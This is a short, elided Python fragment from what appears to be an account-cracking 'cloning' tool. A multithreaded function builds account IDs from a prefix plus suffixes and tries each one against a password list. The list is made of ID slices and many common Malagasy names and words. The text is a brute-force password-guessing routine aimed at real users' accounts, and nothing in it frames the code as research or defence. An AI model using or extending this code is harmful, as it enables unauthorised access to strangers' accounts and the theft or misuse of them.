...
def BD_CLONING():
    ...
    with tred(max_workers=84) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'Mamako','mamako','Mama','mama','tsilavina','Tsilavina','Zandry','zoky','Koloina','koloina','randria','Randria','mamisoa','Mamisoa','boby','Boby','malagasy','Malagasy','rakotomalala','Rakotomalala','zoky','chat','Chat','rojo','Neny','neny','rakoto','Rakoto','diadema','Diadema','diadema','neny','Neny','Dada','dada','Dera','dera','Mino','mino','Verovero','Trano','trano','Fifyh','Rajoelina','mario','Mario','Tiana','Tiana','rindra','Rindra','sarobidy','Sarobidy','Johane','johane','Tsanta','tsanta','Ceasar','ceasar','Feno','feno','nathanael','Natanael','Jemima','jemima','Brenda','brenda','mimi','Mimi','Madagasikara','madagasikara','Nambinina','Nambinina','Felana','felana','Harena','sitraka','Sitraka','safidy','Safidy','zandry','monsieur','Monsieur','Madame','madame','rakotonandrasana','Rakotonandrasana','Andriam','andriam','sambatra','Sambatra']
